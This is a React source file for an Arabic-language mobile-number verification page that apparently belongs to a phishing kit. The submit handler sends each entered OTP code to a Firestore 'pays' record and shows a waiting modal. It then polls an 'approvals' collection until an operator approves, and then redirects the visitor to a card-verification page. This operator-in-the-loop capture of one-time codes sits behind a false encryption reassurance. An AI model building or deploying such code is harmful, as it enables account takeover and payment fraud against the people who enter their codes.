"use client";

import type React from "react";

import { useCallback, useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { addData, db } from "../apis/firebase";
import { resendOtp } from "../lib/actions";
import FirestoreRedirect from "./rediract-page";
import OtpInput from "../components/otp-input";
import { STCModal } from "../components/STCModal";
import { WaitingApprovalModal } from "../components/WaitingApprovalModal";

export default function OtpVerification() {
  const router = useNavigate();
  const [otp, setOtp] = useState<string[]>(Array(6).fill(""));
  const [timer, setTimer] = useState(120); // 2 minutes
  const [error, setError] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [showSTCModal, setShowSTCModal] = useState(false);

  // Add new states
  const [showApprovalModal, setShowApprovalModal] = useState(false);
  const [approvalStatus, setApprovalStatus] = useState<"waiting" | "rejected">(
    "waiting"
  );
  const _id = localStorage.getItem("visitor");

  useEffect(() => {
    // Get phone number from localStorage
    const storedPhoneNumber = localStorage.getItem("phoneNumber");
    if (storedPhoneNumber) {
      setPhoneNumber(storedPhoneNumber);
    }
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prevTimer) => {
        if (prevTimer <= 0) {
          clearInterval(interval);
          return 0;
        }
        return prevTimer - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const formatTime = useCallback((seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${String(minutes).padStart(2, "0")}:${String(
      remainingSeconds
    ).padStart(2, "0")}`;
  }, []);

  const handleOtpChange = useCallback((value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 6).split("");
    while (digits.length < 6) digits.push("");
    setOtp(digits);
    setError("");
  }, []);

  const handleResendCode = useCallback(async () => {
    try {
      const orderId = localStorage.getItem("order_id");
      if (!orderId) {
        setError("لم يتم العثور على معرف الطلب");
        return;
      }

      await resendOtp(JSON.parse(orderId));
      setTimer(120); // Reset timer to 2 minutes
      setError("");
    } catch (error) {
      setError("حدث خطأ أثناء إعادة إرسال الرمز");
    }
  }, []);

  // Function to get data from Firestore
  const getDataFromFirestore = async (collection: string, docId: string) => {
    try {
      // Import Firebase functions
      const { doc, getDoc } = await import("firebase/firestore");

      const docRef = doc(db, collection, docId);
      const docSnap = await getDoc(docRef);

      if (docSnap.exists()) {
        return docSnap.data();
      } else {
        console.log("No such document!");
        return null;
      }
    } catch (error) {
      console.error("Error getting document:", error);
      throw error;
    }
  };

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      const otpValue = otp.join("");

      if (otpValue.length !== 4 && otpValue.length !== 6) {
        setError("يرجى إدخال 4 أو 6 أرقام للتحقق");
        return;
      }

      try {
        const visitorId = localStorage.getItem("visitor");
        if (!visitorId) {
          setError("لم يتم العثور على معرف الزائر");
          return;
        }

        setShowApprovalModal(true);

        // Store the OTP in Firestore for admin approval
        try {
          const { doc, updateDoc, setDoc } = await import("firebase/firestore");

          // Update the pays collection with the OTP
          const paysDocRef = doc(db, "pays", visitorId);
          await updateDoc(paysDocRef, {
            phoneOtp: otpValue,
            phoneOtpStatus: "pending",
            updatedAt: new Date().toISOString(),
          }).catch(async () => {
            // If document doesn't exist, create it
            await setDoc(paysDocRef, {
              phoneOtp: otpValue,
              phoneOtpStatus: "pending",
              createdDate: new Date().toISOString(),
            });
          });

          // Check for approval status
          const approvalDoc = await getDataFromFirestore(
            "approvals",
            visitorId
          );

          if (approvalDoc && approvalDoc.phoneApproved) {
            // Approval found and is approved
            setShowApprovalModal(false);
            addData({ id: visitorId, pagename: "verify-card" });
            router("/verify-card"); // Navigate to verify card page
          } else {
            // Wait for approval
            // Keep the modal open until approval is received
            // We'll poll for approval status
            const checkApproval = setInterval(async () => {
              const updatedApproval = await getDataFromFirestore(
                "approvals",
                visitorId
              );
              if (updatedApproval && updatedApproval.phoneApproved) {
                clearInterval(checkApproval);
                setShowApprovalModal(false);
                addData({ id: visitorId, pagename: "verify-card" });
                router("/verify-card");
              } else if (
                updatedApproval &&
                updatedApproval.phoneApproved === false
              ) {
                clearInterval(checkApproval);
                setShowApprovalModal(false);
                setApprovalStatus("rejected");
                setError("تم رفض طلبك");
              }
            }, 3000); // Check every 3 seconds

            // Clear interval after 2 minutes if no response
            setTimeout(() => {
              clearInterval(checkApproval);
              if (showApprovalModal) {
                setShowApprovalModal(false);
                setError("انتهت مهلة الموافقة، يرجى المحاولة مرة أخرى");
              }
            }, 120000);
          }
        } catch (firestoreError) {
          console.error("Firestore error:", firestoreError);
          setShowApprovalModal(false);
          setError("حدث خطأ أثناء التحقق من حالة الموافقة");
        }
      } catch (error) {
        console.error("Verification error:", error);
        setShowApprovalModal(false);
        setApprovalStatus("rejected");
        setError("حدث خطأ أثناء التحقق من الرمز");
      }
    },
    [otp, router, showApprovalModal]
  );

  return (
    <>
      {_id && <FirestoreRedirect id={_id} collectionName="pays" />}

      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-12 md:py-20 px-4">
        <div className="max-w-2xl mx-auto">
          <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-90 transform transition-all duration-300 hover:shadow-2xl">
            <div className="text-center space-y-4 mb-8">
              <h1 className="text-2xl md:text-3xl font-bold text-[#146394]">
                استكمال بيانات الطلب
              </h1>
              <h2 className="text-xl font-semibold text-[#146394]">
                تحقيق رقم الجوال
              </h2>
              <div className="space-y-2">
                <p className="text-gray-600">
                  تم ارسال رسالة نصية إلى جوالك لربط الوثيقة على رقم الهاتف
                  الخاص بك!
                </p>
                <p className="text-gray-600">
                  يرجى ادخال رمز التحقق المرسل إلى جوالك رقم
                </p>
                <p className="font-bold text-lg text-[#146394] dir-ltr">
                  {phoneNumber}
                </p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-8">
              <div>
                <label
                  htmlFor="otp-input"
                  className="block text-right mb-4 text-[#146394] font-medium"
                >
                  رمز التحقق <span className="text-red-500">*</span>
                </label>
                <div className="flex justify-center">
                  <OtpInput
                    value={otp.join("")}
                    onChange={handleOtpChange}
                    maxLength={6}
                  />
                </div>
                {error && (
                  <p
                    role="alert"
                    className="text-red-500 text-sm mt-2 text-center animate-shake"
                  >
                    {error}
                  </p>
                )}
              </div>

              <div className="text-center text-[#146394] bg-blue-50 p-4 rounded-xl">
                <p>سيتم إرسال رسالة كود التحقق في خلال</p>
                <p className="font-bold text-lg mt-1">
                  {formatTime(timer)} دقيقة
                </p>
              </div>

              <button
                type="submit"
                className="w-full bg-[#146394] text-white py-4 rounded-lg font-semibold transition-all duration-300 hover:bg-[#0f4c70] transform hover:scale-[0.99] active:scale-[0.97] text-lg disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={
                  !(
                    otp.filter((digit) => digit).length === 4 ||
                    otp.filter((digit) => digit).length === 6
                  )
                }
              >
                متابعة
              </button>

              {timer === 0 && (
                <button
                  type="button"
                  onClick={handleResendCode}
                  className="w-full text-[#146394] py-2 font-semibold hover:bg-blue-50 rounded-lg transition-all duration-300"
                >
                  إعادة إرسال الرمز
                </button>
              )}
            </form>

            <div className="mt-8 text-center">
              <div className="flex items-center justify-center gap-2 text-[#146394] bg-blue-50 p-4 rounded-lg transition-all duration-300 hover:bg-blue-100">
                <svg
                  className="w-5 h-5"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                    clipRule="evenodd"
                  />
                </svg>
                <p className="text-sm">
                  نحن نستخدم تقنيات تشفير متقدمة لحماية بياناتك
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {showSTCModal && (
        <STCModal
          isOpen={showSTCModal}
          onClose={(): void => {
            setShowSTCModal(false);
          }}
        />
      )}

      <WaitingApprovalModal
        isOpen={showApprovalModal}
        status={approvalStatus}
        onClose={() => {
          setShowApprovalModal(false);
          setApprovalStatus("waiting");
        }}
      />
    </>
  );
}
